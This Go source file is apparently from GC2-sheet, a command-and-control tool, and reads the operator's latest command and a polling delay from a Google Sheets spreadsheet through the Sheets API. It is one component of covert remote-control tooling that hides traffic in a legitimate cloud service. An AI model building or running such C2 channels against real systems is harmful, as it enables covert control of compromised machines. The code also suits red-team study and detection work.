package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"strconv"

	"google.golang.org/api/sheets/v4"
)

func readSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet) (string, int) {

	var commandResult string
	var tickerDelayResult int

	spreadsheetId := spreadSheet.SpreadSheetId

	sheetName := spreadSheet.CommandSheet.Name

	rangeCell := utils.GetLastCommand(spreadSheet).RangeIn
	rangeId := strconv.Itoa(utils.GetLastCommand(spreadSheet).RangeId)
	// Example: Sheet1!A2
	readRange := sheetName + rangeCell + rangeId

	resp, err := client.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		utils.LogDebug("Unable to retrieve data from sheet: " + err.Error())
		commandResult = ""
	}

	// Provide debug information for issue #5
	if resp == nil {
		utils.LogFatalDebug("Cannot read Sheet ID, verify if API have been enabled for service account: " + err.Error())
	}

	if len(resp.Values) == 0 {
		commandResult = ""
	} else {
		// Get result
		row := resp.Values[0]
		commandResult = fmt.Sprintf("%v", row[0])
	}

	readRange = sheetName + "!" + spreadSheet.CommandSheet.RangeTickerConfiguration
	resp, err = client.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		utils.LogDebug("Unable to retrieve data from sheet: " + err.Error())
		tickerDelayResult = 0
	}

	if len(resp.Values) == 0 {
		tickerDelayResult = 0
	} else {
		// Get result
		row := resp.Values[0]
		tickerDelayResultString := fmt.Sprintf("%v", row[0])
		tickerDelayResult, err = strconv.Atoi(tickerDelayResultString)
		if err != nil {
			tickerDelayResult = 0
		}
	}

	return commandResult, tickerDelayResult
}
